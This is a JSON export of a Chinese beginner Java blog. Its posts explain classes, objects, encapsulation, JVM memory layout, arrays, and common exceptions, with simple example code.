xiaochenyan.top.person;public class Person&#123; String name; private int age; //私有成员变量 private int height; //私有成员变量 private String sex; //私有成员变量 //用于设置age数据 public void setAge(int m_age) &#123; if(m_age &lt; 0) &#123; System.out.println(\"数据异常\"); return; &#125; age = m_age; &#125; //用于设置height数据 public void setHeight(int m_height) &#123; if(m_height &lt; 0) &#123; System.out.println(\"数据异常\"); return; &#125; height = m_height; &#125; //用于设置sex数据 public void setSex(String m_sex) &#123; sex = m_sex; &#125; //用于获取name数据 public String getName() &#123; return name; &#125; //用于获取sex数据 public String getSex() &#123; return sex; &#125; //用于获取age数据 public int getAge()&#123; return age; &#125; //用于获取height数据 public int getHeight() &#123; return height; &#125; //显示所有的成员变量 public void showPersonAll() &#123; System.out.println(name); System.out.println(age); System.out.println(height); System.out.println(sex); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"面向对象的三大特征","slug":"java00035面向对象的三大特征","date":"2020-02-11T10:23:40.000Z","updated":"2020-02-11T10:32:58.359Z","comments":true,"path":"2020/02/11/java00035面向对象的三大特征/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/11/java00035面向对象的三大特征/","excerpt":"","text":"面向对象的三大特征 面向对象的三大特征:封装,继承,多态 封装性在java当中体现: 1.方法就是一种封装 2.关键字private也是一种封装 封装就是将一些细节信息隐藏起来,对外界不可见. 12345678910public class Main4 &#123; public static void main(String[] args) &#123; Phone one = new Phone(); one.brand = \"苹果\"; one.price = 8388.0; one.color = \"黑色\"; one.printAll();//封装性,不用了解方法是怎么实现显示成员变量的,只需要知道怎么调用就行了. &#125;&#125; 12345678910111213public class Phone &#123; String brand;//产品 double price;//价格 String color;//颜色 public void printAll() &#123; System.out.println(brand); System.out.println(price); System.out.println(color); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"局部变量和成员变量的区别","slug":"java00034局部变量和成员变量的区别","date":"2020-02-11T02:59:03.000Z","updated":"2020-02-11T03:15:47.154Z","comments":true,"path":"2020/02/11/java00034局部变量和成员变量的区别/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/11/java00034局部变量和成员变量的区别/","excerpt":"","text":"局部变量和成员变量的区别 1.定义的位置不一样 局部变量:在方法内部定义 成员变量:在方法外部定义,直接写在类当中 2.作用范围不一样 局部变量:只有方法当中才可以使用,出了方法就不能再用 成员变量:整个类全部都可以通用. 3.默认值不一样 局部变量:没有默认值,如果想使用,必须手动进行赋值 成员变量:如果没有赋值,会有默认值,规则和数组一样 4.内存的位置不一样 局部变量:位于栈内存 成员变量:位于堆区内存 5.生命周期不一样 局部变量:随着方法进栈而诞生,随着方法出栈而消失 成员变量:随着对象创建而诞生,随着对象被垃圾回收而消失 1234567891011public class Main3 &#123; public static void main(String[] args) &#123; Phone one = new Phone();//在堆区诞生 int a;//在栈区诞生 System.out.println(one.color);//默认值为null //System.out.println(a);//int a没有初始化,所以不能被使用. &#125;&#125; 123456789101112131415//类的定义public class Phone &#123; //成员变量在整个类作用域有效 String brand;//产品 double price;//价格 String color;//颜色 public void printAll() &#123; System.out.println(brand); System.out.println(price); System.out.println(color); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"使用对象类型作为方法的返回值","slug":"java00033使用对象类型作为方法的返回值","date":"2020-02-11T02:10:46.000Z","updated":"2020-02-11T02:20:10.670Z","comments":true,"path":"2020/02/11/java00033使用对象类型作为方法的返回值/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/11/java00033使用对象类型作为方法的返回值/","excerpt":"","text":"使用对象类型作为方法的返回值 当使用一个对象类型作为方法的返回值时:返回值其实就是对象的地址. 1234567891011121314151617public class Main2 &#123; public static void main(String[] args) &#123; Phone two = getPhone(); System.out.println(two.brand);//苹果 System.out.println(two.price);//8388.0 System.out.println(two.color);//玫瑰金 &#125; public static Phone getPhone()&#123; Phone one = new Phone(); one.brand = \"苹果\"; one.price = 8388.0; one.color = \"玫瑰金\"; return one; &#125;&#125; 1234567891011121314public class Phone &#123; String brand;//产品 double price;//价格 String color;//颜色 public void printAll() &#123; System.out.println(brand); System.out.println(price); System.out.println(color); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"两个对象指向同一个引用的内存图","slug":"java00031两个对象指向同一个引用的内存图","date":"2020-02-11T01:50:54.000Z","updated":"2020-02-11T01:56:52.138Z","comments":true,"path":"2020/02/11/java00031两个对象指向同一个引用的内存图/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/11/java00031两个对象指向同一个引用的内存图/","excerpt":"","text":"两个对象指向同一个引用的内存图 其中one对象和two对象都指向同一个堆 只要其中一个对象发生改变,另一个对象也会发生改变","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"使用对象类型作为方法的参数","slug":"java00032使用对象类型作为方法的参数","date":"2020-02-11T01:48:44.000Z","updated":"2020-02-11T02:12:25.873Z","comments":true,"path":"2020/02/11/java00032使用对象类型作为方法的参数/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/11/java00032使用对象类型作为方法的参数/","excerpt":"","text":"使用对象类型作为方法的参数 当一个对象作为参数,传递到方法当中时,实际上传进去的是对象的地址值 1234567891011121314151617public class Main &#123; public static void main(String[] args) &#123; Phone one = new Phone(); one.brand = \"苹果\"; one.price = 8388.0; one.color = \"黑色\"; method(one); &#125; public static void method(Phone param)&#123; System.out.println(param.brand);//苹果 System.out.println(param.price);//8388.0 System.out.println(param.color);//黑色 &#125;&#125; 123456789101112131415//类的定义public class Phone &#123; String brand; double price; String color; public void printAll() &#123; System.out.println(brand); System.out.println(price); System.out.println(color); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java两个对象使用同一个方的法内存","slug":"java00030两个对象使用同一个方法的内存","date":"2020-02-09T10:44:09.000Z","updated":"2020-02-09T11:03:45.735Z","comments":true,"path":"2020/02/09/java00030两个对象使用同一个方法的内存/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00030两个对象使用同一个方法的内存/","excerpt":"","text":"java两个对象使用同一个方的法内存 1.创建one对象时会创建一个堆,one指向堆地址 2.修改one.brand成员变量时,先从one找到堆地址,接着再从堆中找到brand变量,然后修改brand的值为&quot;苹果&quot; 3.修改one.price成员变量时,先从one找到堆地址,接着再从堆中找到price变量,然后修改price的值为8388.0 4.修改one.color成员变量时,先从one找到堆地址,接着再从堆中找到color变量,然后修改color的值为黑色 5.调用one.call()方法,先从one找到堆地址,接着从堆中找到成员方法所在方法区中的地址,然后在从方法区中找到one.call()方法,接着将one.call()方法压入栈. 1).初始化who参数的值为&quot;乔布斯&quot; 2).输出&quot;给xxx打电话&quot; 3).将one.call()方法退栈 4).返回到调用one.call()方法中的下一条语句 6.调用one.sendMessage()方法,先从one找到堆地址,接着从堆中找到成员方法所在方法区中的地址,然后在从方法区中找到one.sendMessage()方法,接着将one.sendMessage()方法压入栈. 1).输出&quot;群发短信&quot; 2).将one.sendMessage()方法退栈 3).返回到调用one.sendMessage()方法中的下一条语句 7.创建two对象时会创建一个堆,two指向堆地址 8.修改two.brand成员变量时,先从two找到堆地址,接着再从堆中找到brand变量,然后修改brand的值为&quot;三星&quot; 9.修改two.price成员变量时,先从two找到堆地址,接着再从堆中找到price变量,然后修改price的值为5999.0 10.修改two.color成员变量时,先从two找到堆地址,接着再从堆中找到color变量,然后修改color的值为蓝色 11.调用two.call()方法,先从two找到堆地址,接着从堆中找到成员方法所在方法区中的地址,然后在从方法区中找到two.call()方法,接着将two.call()方法压入栈. 1).初始化who参数的值为&quot;欧巴&quot; 2).输出&quot;给欧巴打电话&quot; 3).将two.call()方法退栈 4).返回到调用two.call()方法中的下一条语句 12.调用two.sendMessage()方法,先从two找到堆地址,接着从堆中找到成员方法所在方法区中的地址,然后在从方法区中找到two.sendMessage()方法,接着将two.sendMessage()方法压入栈. 1).输出&quot;群发短信&quot; 2).将two.sendMessage()方法退栈 3).返回到调用two.sendMessage()方法中的下一条语句 13.main方法结束,将main方法退栈; one对象方法和two对象方法是指向同一个方法内存的","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"一个对象的内存图","slug":"java00029一个对象的内存图","date":"2020-02-09T07:40:56.000Z","updated":"2020-02-09T10:51:42.281Z","comments":true,"path":"2020/02/09/java00029一个对象的内存图/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00029一个对象的内存图/","excerpt":"","text":"一个对象的内存图 1.创建one对象时会创建一个堆,one指向堆地址 2.修改one.brand成员变量时,先从one找到堆地址,接着再从堆中找到brand变量,然后修改brand的值为&quot;苹果&quot; 3.修改one.price成员变量时,先从one找到堆地址,接着再从堆中找到price变量,然后修改price的值为8388.0 4.修改one.color成员变量时,先从one找到堆地址,接着再从堆中找到color变量,然后修改color的值为黑色 5.调用one.call()方法,先从one找到堆地址,接着从堆中找到成员方法所在方法区中的地址,然后在从方法区中找到one.call()方法,接着将one.call()方法压入栈. 1).初始化who参数的值为&quot;乔布斯&quot; 2).输出&quot;给xxx打电话&quot; 3).将one.call()方法退栈 4).返回到调用one.call()方法中的下一条语句 6.调用one.sendMessage()方法,先从one找到堆地址,接着从堆中找到成员方法所在方法区中的地址,然后在从方法区中找到one.sendMessage()方法,接着将one.sendMessage()方法压入栈. 1).输出&quot;群发短信&quot; 2).将one.sendMessage()方法退栈 3).返回到调用one.sendMessage()方法中的下一条语句 7.main方法结束,将main方法退栈;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"类的定义","slug":"java00027类的定义","date":"2020-02-09T06:37:24.000Z","updated":"2020-02-09T06:44:49.507Z","comments":true,"path":"2020/02/09/java00027类的定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00027类的定义/","excerpt":"","text":"类的定义 定义一个类,有两个组成部分: 成员属性: 事物的状态信息. 成员行为: 事物的行为. 注意事项: 1.成员变量是直接定义在类当中的,在方法外面. 2.成员方法不要写static关键字. 1234567891011121314151617181920212223242526272829303132333435363738394041424344package xiaochenyan.top.banji;/*定义一个类,用模拟\"学生\"事物.其中有两个组成部分:属性(是什么): 姓名 年龄行为(能做什么): 吃饭 睡觉 学习对应到Java的类当中:成员变量(属性): String name; int age;成员方法(行为): public void eat()&#123;&#125;; //吃饭 public void sleep()&#123;&#125;; //睡觉 public void study()&#123;&#125;; //学习*/public class Student01 &#123; //属性(成员变量) String name; int age; //行为(成员方法) public void eat()&#123; System.out.println(\"吃饭饭\"); &#125; public void sleep()&#123; System.out.println(\"睡觉觉\"); &#125; public void study()&#123; System.out.println(\"学习!\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"对象的创建及其使用","slug":"java00028对象的创建及其使用","date":"2020-02-09T06:28:42.000Z","updated":"2020-02-09T06:37:01.158Z","comments":true,"path":"2020/02/09/java00028对象的创建及其使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00028对象的创建及其使用/","excerpt":"","text":"对象的创建及其使用 1.导包: 也就是指出需要使用的类,在什么位置. import 包名称.类名称; import xiaochenyan.top.banji; 对于和当前类属于同一个包的情况,可以省略导包语句不写. 2.创建,格式 类名称 对象名 = new 类名称(); Student01 std = new Student01(); 3.使用,分为两种情况 使用成员变量,对象名.成员变量 使用成员方法,对象名.成员方法名(参数) (也就是,想用谁,就用对象名点谁) 123456789101112131415161718192021222324252627282930313233343536373839404142434445package xiaochenyan.top.banji;//导包格式import xiaochenyan.top.banji.Student01;/*1.导包: 也就是指出需要使用的类,在什么位置.import 包名称.类名称;import xiaochenyan.top.banji;对于和当前类属于同一个包的情况,可以省略导包语句不写.2.创建,格式类名称 对象名 = new 类名称();Student01 std = new Student01();3.使用,分为两种情况使用成员变量,对象名.成员变量使用成员方法,对象名.成员方法名(参数)(也就是,想用谁,就用对象名点谁) */public class test001 &#123; public static void main(String[] args) &#123; //创建对象格式 Student01 std = new Student01(); //使用成员变量格式 System.out.println(std.age); System.out.println(std.name); //使用成员方法格式 std.eat(); std.sleep(); std.study(); System.out.println(\"===========================\"); std.name = \"金毛狮王\"; std.age = 52; //使用成员变量格式 System.out.println(std.age); System.out.println(std.name); //使用成员方法格式 std.eat(); std.sleep(); std.study(); System.out.println(\"===========================\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"类的定义","slug":"java00026类的定义","date":"2020-02-09T05:52:12.000Z","updated":"2020-02-09T06:04:59.484Z","comments":true,"path":"2020/02/09/java00026类的定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00026类的定义/","excerpt":"","text":"类的定义 事物与类的对比 现实世界的一类事物: 属性: 事物的状态信息 行为: 事物能够做什么 java中用class描述事物也是如此: 成员变量: 对应事物的属性 成员方法: 对应事物的行为 类的定义格式 1234public class ClassName&#123; //成员变量 //成员方法&#125; 定义类: 就是定义类的成员,包括成员变量和成员方法. 成员变量: 和以前定义变量几乎一样的,只不过位置发生了改变.在类中,在方法外. 成员方法: 和以前定义方法几乎是一样的.只不过把static去掉.","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"类和对象的关系","slug":"java00025类和对象的关系","date":"2020-02-09T05:47:30.000Z","updated":"2020-02-09T05:50:15.205Z","comments":true,"path":"2020/02/09/java00025类和对象的关系/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00025类和对象的关系/","excerpt":"","text":"类和对象","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"面向对象思想的举例","slug":"java00024面向对象思想的举例","date":"2020-02-09T05:44:02.000Z","updated":"2020-02-09T05:46:38.927Z","comments":true,"path":"2020/02/09/java00024面向对象思想的举例/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00024面向对象思想的举例/","excerpt":"","text":"举例","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"面向对象思想的概述","slug":"java00023面向对象思想的概述","date":"2020-02-09T05:29:23.000Z","updated":"2020-02-09T05:41:57.338Z","comments":true,"path":"2020/02/09/java00023面向对象思想的概述/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00023面向对象思想的概述/","excerpt":"","text":"面向过程: 当需要实现一个功能的时候,每一个具体的步骤都要亲力亲为,详细处理每一个细节. 面向对象: 当需要实现一个功能的时候,不关心具体的步骤,而是找一个已经具有该功能的人,来帮我做事儿. 12345678910111213141516171819202122232425262728package xiaochenyan.top.banji;import java.util.Arrays;public class Student &#123; public static void main(String[] args) &#123; int[] array = &#123;1,23,4,15,51,2,52,23&#125;; //要求打印格式为[123,,123,41,123,] //使用面向过程,每一个步骤细节都要亲力亲为 System.out.print(\"[\"); for(int i = 0;i &lt; array.length;i++) &#123; if(i == array.length - 1) &#123; System.out.println(array[i] + \"]\"); &#125;else&#123; System.out.print(array[i] + \", \"); &#125; &#125; System.out.println(\"======================\"); //使用面向对象 //找一个JDK给我们提供好的Arrays类 //其中有一个toString方法,直接就能把数组变成想要的格式字符串 System.out.println(Arrays.toString(array)); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数组作为方法的返回值返回","slug":"java00022数组作为方法返回值返回","date":"2020-02-08T10:20:21.000Z","updated":"2020-02-09T04:59:23.096Z","comments":true,"path":"2020/02/08/java00022数组作为方法返回值返回/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00022数组作为方法返回值返回/","excerpt":"","text":"一个方法可以有1个或多个参数;但是只能有0个或1个返回值,不能有个多返回值. 如果希望一个方法当中产生了多个结果数据进行返回 , 怎么办 ? 解决方案:使用一个数组作为返回值类型即可. 任何数据类型都能作为方法的参数类型,或者返回值类型. 数组作为方法的参数,传递进去的其实是数组的地址值 数组作为方法的返回值,返回的其实是数组的地址值 1234567891011121314151617181920public class test020 &#123; public static void main(String[] args) &#123; int[] array = sumAndPingJunShu(1,2,3); for (int i : array) &#123; System.out.println(i); &#125; &#125; public static int[] sumAndPingJunShu(int a,int b,int c) &#123; int sum = a + b + c; int pjs = (a + b + c) / 3; int cj = a * b * c; int[] array = &#123;sum,pjs,cj&#125;; return array; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数组作为方法参数","slug":"java00021数组作为方法参数","date":"2020-02-08T10:12:58.000Z","updated":"2020-02-08T10:17:30.536Z","comments":true,"path":"2020/02/08/java00021数组作为方法参数/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00021数组作为方法参数/","excerpt":"","text":"数组可以作为方法的参数 当调用方法的时候,向方法的小括号进行传参,传递进去的其实是数组的地址值. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package xiaochenyan.top;public class test019 &#123; public static void main(String[] args) &#123; int[] array = &#123;1,234,12,4,124,21,315,15,1235,461,235,1,34632,135,124151,32515,612,351,35&#125;; arraySort(array); // 把数组地址值传递给形参 arrayOut(array); // 把数组地址值传递给形参 funFZ(array); // 把数组地址值传递给形参 arrayOut(array); // 把数组地址值传递给形参 &#125; //冒泡法排序 public static void arraySort(int[] array) &#123; for(int i = 0;i &lt; array.length - 1;i++) &#123; for(int j = 0;j &lt; array.length - (i + 1);j++) &#123; if(array[j] &lt; array[j + 1] ) &#123; int temp = array[j]; array[j] = array[j + 1]; array[j + 1] = temp; &#125; &#125; &#125; &#125; //数组遍历输出 public static void arrayOut(int[] array) &#123; for (int i : array) &#123; System.out.print(i + \" \" ); &#125; System.out.println(\"\"); System.out.println(\"===================================\"); &#125; //数组反转 public static void funFZ(int[] array) &#123; int max = array.length - 1; int min = 0; for(;min &lt; max;min++,max--) &#123; int temp = array[min]; array[min] = array[max]; array[max] = temp; &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"获取数组的最大值","slug":"java00019获取数组的最大值","date":"2020-02-08T07:37:28.000Z","updated":"2020-02-08T09:32:21.502Z","comments":true,"path":"2020/02/08/java00019获取数组的最大值/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00019获取数组的最大值/","excerpt":"","text":"12345678910111213141516public class test018 &#123; public static void main(String[] args) &#123; int[] array = &#123;1,2,21,41,1235,21,12,52,2351,234,12,234,23,123412,12&#125;; int max = array[0]; for (int i = 1;i &lt; array.length;i++) &#123; if(max &lt; array[i]) // 如果max 小于 array[i],那么将array[i]的值,赋值给max &#123; max = array[i]; &#125; &#125; System.out.println(\"array数组的最大值:\" + max); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数组的遍历输出","slug":"java00020数组的遍历输出","date":"2020-02-08T07:25:09.000Z","updated":"2020-02-08T09:32:08.533Z","comments":true,"path":"2020/02/08/java00020数组的遍历输出/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00020数组的遍历输出/","excerpt":"","text":"遍历数组,说的就是对数组当中的每一个元素进行逐一处理.默认的处理方式就是打印输出. 123456789101112131415161718public class test017 &#123; public static void main(String[] args) &#123; int[] array = &#123;1,2,324,12,234,15,12,51,234,21&#125;; //第一种方法,将array的每一个元素逐次赋值给i for (int i : array) &#123; System.out.println(i); &#125; System.out.println(\"======================\"); //第二种方法,将i当做array的下标,通过i的不断增加,来打印array数组,且i小于array.length for (int i = 0; i &lt; array.length;i++) &#123; System.out.println(array[i]); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数组元素反转","slug":"java00018数组元素反转","date":"2020-02-08T07:13:31.000Z","updated":"2020-02-08T09:09:01.983Z","comments":true,"path":"2020/02/08/java00018数组元素反转/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00018数组元素反转/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public class test019 &#123; public static void main(String[] args) &#123; int[] array = &#123;1,234,12,4,124,21,315,15,1235,461,235,1,34632,135,124151,32515,612,351,35&#125;; //数组排序 arraySort(array); //数组遍历输出 arrayOut(array); //数组反转 funFZ(array); //数组遍历输出 arrayOut(array); &#125; //冒泡法排序 public static void arraySort(int[] array) &#123; for(int i = 0;i &lt; array.length - 1;i++) &#123; for(int j = 0;j &lt; array.length - (i + 1);j++) &#123; if(array[j] &lt; array[j + 1] ) &#123; int temp = array[j]; array[j] = array[j + 1]; array[j + 1] = temp; &#125; &#125; &#125; &#125; //数组遍历输出 public static void arrayOut(int[] array) &#123; for (int i : array) &#123; System.out.print(i + \" \" ); &#125; System.out.println(\"\"); System.out.println(\"===================================\"); &#125; //数组反转 public static void funFZ(int[] array) &#123; int max = array.length - 1; int min = 0; for(;min &lt; max;min++,max--) &#123; int temp = array[min]; array[min] = array[max]; array[max] = temp; &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"获取数组长度","slug":"java00017获取数组长度","date":"2020-02-08T07:13:31.000Z","updated":"2020-02-08T07:16:52.078Z","comments":true,"path":"2020/02/08/java00017获取数组长度/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00017获取数组长度/","excerpt":"","text":"如何获取数组的长度,格式: 数组名称.length 这将会得到一个int数字,代表数组的长度. 数组一旦创建,程序运行期间,长度不可发生改变. 123456789101112131415161718192021/*如何获取数组的长度,格式:数组名称.length这将会得到一个int数字,代表数组的长度.数组一旦创建,程序运行期间,长度不可发生改变. */public class test016 &#123; public static void main(String[] args) &#123; int[] arrayA = &#123;12,12,324,5,15,12,535,13&#125;; //获取数组arrayA的长度 System.out.println(\"arrayA数组的长度:\" + arrayA.length); int[] arrayB = new int[3]; //获取数组arrayB的长度 System.out.println(\"arrayB数组的长度:\" + arrayB.length); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"常见问题 空指针异常","slug":"java00016常见问题-空指针异常","date":"2020-02-08T06:59:12.000Z","updated":"2020-02-08T07:06:45.688Z","comments":true,"path":"2020/02/08/java00016常见问题-空指针异常/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00016常见问题-空指针异常/","excerpt":"","text":"所有的引用类型变量,都可以赋值为一个null值.但是代表其中什么都没有. 数组必须进行new初始化才能使用其中的元素 如果只是赋值了一个null,没有进行new创建, 那么将会发生: 空指针异常 NullPointerException 原因:忘了补new 解决:补上new 1234567891011121314151617181920public class test015 &#123; /* 所有的引用类型变量,都可以赋值为一个null值.但是代表其中什么都没有. 数组必须进行new初始化才能使用其中的元素 如果只是赋值了一个null,没有进行new创建, 那么将会发生: 空指针异常 NullPointerException 原因:忘了补new 解决:补上new */ public static void main(String[] args) &#123; int[] array = null; //array = new int[3]; System.out.println(array[0]);//空指针异常 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数组索引越界异常","slug":"java00015数组索引越界异常","date":"2020-02-08T06:46:01.000Z","updated":"2020-02-08T06:59:30.245Z","comments":true,"path":"2020/02/08/java00015数组索引越界异常/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00015数组索引越界异常/","excerpt":"","text":"数组索引从0开始,一直到数组长度-1为止. 如果访问数组元素的时候,索引编号并不存在,那么将会发生数组索引越界异常 提示:ArrayIndexOutOfBoundsException 原因: 索引编号写错了 解决: 修改成为存在的正确索引编号. 1234567891011121314151617181920212223package xiaochenyan.top;public class test014 &#123; /* 数组索引从0开始,一直到数组长度-1为止. 如果访问数组元素的时候,索引编号并不存在,那么将会发生数组索引越界异常 ArrayIndexOutOfBoundsException 原因: 索引编号写错了 解决: 修改成为存在的正确索引编号. */ public static void main(String[] args) &#123; int[] array = new int[4]; array[0] = 1; array[1] = 2; array[2] = 3; array[3] = 4; // 数组越界,发生异常,导致错误 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"两个引用指向同一个数组","slug":"java00014两个引用指向同一个数组","date":"2020-02-07T20:05:38.000Z","updated":"2020-02-07T20:08:12.994Z","comments":true,"path":"2020/02/08/java00014两个引用指向同一个数组/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00014两个引用指向同一个数组/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132package xiaochenyan.top;public class test013 &#123; public static void main(String[] args) &#123; int[] arrayA = new int[3]; System.out.println(arrayA); System.out.println(arrayA[0]); System.out.println(arrayA[1]); System.out.println(arrayA[2]); System.out.println(&quot;====================&quot;); arrayA[1] = 10; arrayA[2] = 20; System.out.println(arrayA); System.out.println(arrayA[0]); System.out.println(arrayA[1]); System.out.println(arrayA[2]); System.out.println(&quot;====================&quot;); int[] arrayB = arrayA; System.out.println(arrayB); System.out.println(arrayB[0]); System.out.println(arrayB[1]); System.out.println(arrayB[2]); System.out.println(&quot;====================&quot;); arrayB[1] = 10; arrayB[2] = 20; System.out.println(arrayB); System.out.println(arrayB[0]); System.out.println(arrayB[1]); System.out.println(arrayB[2]); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"两个数组的内存图","slug":"java00013两个数组的内存图","date":"2020-02-07T19:28:56.000Z","updated":"2020-02-07T19:35:14.584Z","comments":true,"path":"2020/02/08/java00013两个数组的内存图/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00013两个数组的内存图/","excerpt":"","text":"1234567891011121314package xiaochenyan.top;public class test012 &#123; public static void main(String[] args) &#123; int[] array1 = new int[3]; //创建一个包含三个元素的array1数组 System.out.println(array1); //打印array1的地址 array1[1] = 2; //修改array1[1]的值 array1[2] = 100; //修改array1[2]的值 int[] array2 = new int[3]; //创建一个包含三个元素的array2数组 System.out.println(array2); //打印array2的地址 array2[1] = 300; //修改array2[1]的值 array2[2] = 25; //修改array2[2]的值 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"一个数组的内存图","slug":"java00012一个数组的内存图","date":"2020-02-07T18:51:11.000Z","updated":"2020-02-07T18:55:45.444Z","comments":true,"path":"2020/02/08/java00012一个数组的内存图/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00012一个数组的内存图/","excerpt":"","text":"12345678910111213public class test011 &#123; public static void main(String[] args) &#123; int[] array = new int[3];//从堆区创建一个包含三个元素的数组 System.out.println(array); array[1] = 2; //从堆区把array[1]的值修改成2 array[2] = 200;//从堆区把array[2]的值修改成100 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Java中的内存划分","slug":"java00011Java中的内存划分","date":"2020-02-07T15:10:32.000Z","updated":"2020-02-07T15:42:07.946Z","comments":true,"path":"2020/02/07/java00011Java中的内存划分/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/07/java00011Java中的内存划分/","excerpt":"","text":"Java的内存需要划分成为5个部分 1.栈（Stack）: 存放的都是方法中的局部变量。方法的运行一定要在栈当中运行。 局部变量：方法的参数，或者是方法{}内部的变量 作用域：一但超出作用域，立刻从栈内存中消失。 2.堆（Heap）：凡是new出来的内存，都在堆区中。 堆内存里面的内存都有一个内存地址值：16进制 堆内存里面的数据，都有默认值。规则： 如果是整数 默认值为0 如果是浮点数 默认值为0.0 如果是字符 默认值为‘\\u0000’ 如果是布尔 默认值为false 如果是引用类型 默认值为null 3.方法区（Method Area）：存储.class相关的信息，包含方法的信息 4.本地方法栈（Native Method Stack）：与操作系统相关。 5.寄存器（PC Register）：与CPU相关。","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数组","slug":"java00010数组","date":"2020-02-05T21:39:02.000Z","updated":"2020-02-07T11:50:26.499Z","comments":true,"path":"2020/02/06/java00010数组/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/06/java00010数组/","excerpt":"","text":"数组 数组的概念 ​ 数组是引用数据类型 ​ 类型要统一 ​ 数组的长度在运行期间不可以改变 初始化 动态初始化（指定长度） ​ 数据类型[] 数组名称 = new 数据类型[数组长度] ​ 使用动态初始化数组的时候,其中的元素将会自动拥有一个默认值.规则如下: 如果是整数类型,那么默认值为0; 如果是浮点类型,那么默认值为0.0; 如果是字符类型,那么默认值为’\\u0000’ u代表Unicode ,0000代表十六进制数; 如果是布尔类型,那么默认值为false; 如果是引用类型,那么默认值为null(空常量); 注意事项 静态初始化其实也有默认值的过程,只不过系统自动马上将默认值替换成为了大括号当中的具体数值. 123456789101112131415class test010 &#123; public static void main(String[] args) &#123; int[] arr1 = new int[10]; int[] arr2 = new 